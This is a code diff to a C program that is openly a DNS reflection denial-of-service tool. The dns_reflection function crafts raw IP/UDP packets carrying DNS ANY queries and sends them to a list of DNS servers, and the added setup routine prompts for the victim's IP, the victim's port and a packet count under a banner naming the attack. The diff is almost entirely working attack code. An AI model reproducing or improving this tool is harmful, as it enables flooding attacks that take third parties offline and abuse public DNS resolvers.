@@ -115,18 +115,18 @@ void dns_reflection(char * victimIP, int victimPort, int query_type, int nPacket
 		int payloadLength = dns_payload_gen(data, hostNames[curHost], query_type);
 
 		//update ip header
-		iph->daddr = inet_addr(dnsServers[curDns]);
-		iph->tot_len = sizeof (struct iphdr) + sizeof (struct udphdr) + payloadLength;
+		iph -> daddr = inet_addr(dnsServers[curDns]);
+		iph -> tot_len = sizeof (struct iphdr) + sizeof (struct udphdr) + payloadLength;
 
 		//reset checksums
 		iph -> check = 0;
-		udph->check = 0;
+		udph -> check = 0;
 
 		//Ip checksum
-		iph->check = csum ((unsigned short *) datagram, iph->tot_len);
+		iph -> check = csum ((unsigned short *) datagram, iph->tot_len);
 
 		//update udp header
-		udph->len = htons(8 + payloadLength);	//udp size
+		udph -> len = htons(8 + payloadLength);	//udp size
 		
 
 		//update udp checksum
@@ -136,7 +136,7 @@ void dns_reflection(char * victimIP, int victimPort, int query_type, int nPacket
 		pseudogram = malloc(psize);	
 		memcpy(pseudogram , (char*) &psh , sizeof (struct pseudo_header));
 		memcpy(pseudogram + sizeof(struct pseudo_header) , udph , sizeof(struct udphdr) + payloadLength);
-		udph->check = csum( (unsigned short*) pseudogram , psize);
+		udph -> check = csum( (unsigned short*) pseudogram , psize);
 		free(pseudogram);
 
 		//send packet
@@ -156,6 +156,27 @@ void dns_reflection(char * victimIP, int victimPort, int query_type, int nPacket
 }
 
 void dns_reflection_setup(){
+	system("clear");
+	printf("\033[01;33m"); //set color to yellow
 	printf("⋊Ɔ∀⊥⊥∀ NOI⊥ƆƎ˥ℲƎᴚ SNᗡ\n");
-    dns_reflection("192.168.2.3", 6666, ANY, 10);
+	printf("\033[0m");//reset color
+
+	char victimIp[32];
+	int victimPort = 0;
+	int nPackets = 0;
+	
+	while ((getchar()) != '\n'); //clear out buffer
+	
+	printf ("Enter victim's IP : ");
+	fgets(victimIp, 32, stdin);
+	victimIp[strcspn(victimIp, "\n")] = 0;
+
+	printf ("Enter victim's port : ");
+	scanf ("%d", &victimPort);
+
+	printf ("Enter number of packets : ");
+	scanf ("%d", &nPackets);
+
+	printf ("DNS Request type : ANY\n");
+    dns_reflection(victimIp, victimPort, ANY, nPackets);
 }
